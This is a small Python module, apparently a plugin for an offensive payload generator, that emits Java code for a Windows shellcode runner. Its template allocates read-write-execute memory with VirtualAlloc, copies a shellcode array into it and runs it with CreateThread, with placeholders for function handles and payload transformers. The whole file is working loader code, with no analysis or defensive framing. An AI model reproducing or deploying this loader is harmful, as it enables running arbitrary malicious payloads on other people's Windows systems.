class shellcoderunner:
    def __init__(self, arguments):
        pass

    def imports(self) -> list[str]:
        return ["import java.lang.foreign.Arena;",
                "import java.lang.foreign.FunctionDescriptor;",
                "import java.lang.foreign.Linker;",
                "import java.lang.foreign.MemoryLayout;",
                "import java.lang.foreign.MemorySegment;",
                "import java.lang.foreign.SymbolLookup;",
                "import java.lang.foreign.ValueLayout;",
                "import java.lang.invoke.MethodHandle;",
                "import static java.lang.foreign.ValueLayout.*;",]

    def compilerOptions(self) -> list[str]:
        return []

    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:
        return """
        {transformers}
        MemorySegment address = (MemorySegment) {VirtualAlloc}(MemorySegment.NULL, (long)shellcode.length, 0x3000, 0x40);
        address = address.reinterpret(shellcode.length);
        MemorySegment.copy(MemorySegment.ofArray(shellcode), 0, address, 0, shellcode.length);
        long hThread = (long) {CreateThread}(MemorySegment.NULL, (long)0, address, MemorySegment.NULL, 0, MemorySegment.NULL);
        int result = (int) {WaitForSingleObject}(hThread, -1);
"""